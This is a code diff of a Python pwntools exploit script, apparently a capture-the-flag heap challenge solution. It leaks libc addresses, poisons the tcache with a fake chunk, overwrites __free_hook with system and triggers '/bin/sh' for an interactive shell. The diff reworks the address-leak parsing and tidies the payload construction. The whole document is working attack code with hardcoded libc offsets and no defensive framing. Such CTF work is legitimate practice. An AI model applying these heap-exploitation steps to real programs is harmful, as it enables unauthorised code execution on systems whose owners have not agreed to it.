@@ -33,13 +33,13 @@ def remove(num):
 
 #overwrite the fd
 register('a\n', 'a\n','a\n')
-register('b'*0x20,'b'*0x20,'b\n')
-register('c'*0x20,'c'*0x20,'c\n')
-register('d'*0x20,'d'*0x20,'d\n')
+register('b\n','b\n','b\n')
+register('c\n','c\n','c\n')
+register('d\n','d'*0x20,'d\n')
 login('a', 'a')
 
 #leak address
-add('y'*0x18, 0x1000, 'y\n')
+add('', 0x1000, '\n')
 p.send(p64(0xdeaddead000))
 p.send(p64(0xdeaddead000))
 p.send(p64(0))
@@ -47,16 +47,21 @@ p.send(p64(0))
 add('', 0x100, '\n')
 p.send(p64(0xdeaddeae000))
 p.send(p64(0xdeaddeae000))
-p.send(p64(0)*4)
+p.send((p64(0)+p64(0x1111111111111111))*2)
 
 p.sendlineafter('Choice: ', '4')
-p.recvuntil('1 - [yyyyyyyyyyyyyyyyyyyyyyyy')
-bin_base = u64(p.recv(6)+'\x00\x00') - 0x211d
-p.recvuntil('\n')
-libc_base = u64(p.recv(14).decode('hex')+'\x00') - 0x3ec2b0
-p.recv(14)
-heap_base = u64(p.recv(14).decode('hex')+'\x00') - 0x250
+p.recvuntil(']\n')
+p.recvuntil(']\n')
 
+buf1 = p.recvuntil('00')
+buf2 = p.recvuntil('1111')
+if len(buf1)==14:
+    libc_base = u64(buf1.decode('hex')+'\x00') - 0x3ec2b0
+elif len(buf2)==16:
+    libc_base = (u64(buf2.decode('hex'))^0x1111111111111111) - 0x3ec2b0
+else:
+    exit()
+    
 #make fake tcache 
 edit(0, -1, 'a\n')
 payload = 'd'*0xfd0 + p32(0x100) + p32(1) + p64(0xdeaddeaf040)
@@ -64,18 +69,12 @@ add('c', 0x1100, payload+'\n')
 p.send(p64(0xdeaddead000))
 p.send(p64(0xdeaddead000))
 p.send(p64(0)*4)
-
-payload = p64(0) + p64(0x31)
-payload += p64(0) * 5
-payload += p64(0x31)
+payload = p64(0)+p64(0x31)+p64(0) * 5+p64(0x31)
 edit(5, 0x100, payload+'\n')
-
 remove(0)
 
-#overwrite free_hook
-payload = p64(0) + p64(0x31)
-payload += p64(libc_base + 0x3ed8e8)+p64(0) * 4
-payload += p64(0x31)
+free_hook = libc_base + 0x3ed8e8
+payload = p64(0) + p64(0x31)+p64(free_hook)+p64(0) * 4+p64(0x31)
 edit(5, 0x100, payload+'\n')
 
 add('a', 0xf00, 'a\n')
@@ -83,10 +82,12 @@ p.send(p64(0xbeefdead000))
 p.send(p64(0xbeefdead000))
 p.send(p64(0)*4)
 
+#overwrite free_hook
+system = libc_base+0x4f440
 add('a', 0xf00, '/bin/sh\x00\n')
 p.send(p64(0xbeefdead000))
 p.send(p64(0xbeefdead000))
-p.send(p64(libc_base+0x4f440))
+p.send(p64(system))
 
 p.interactive()
 
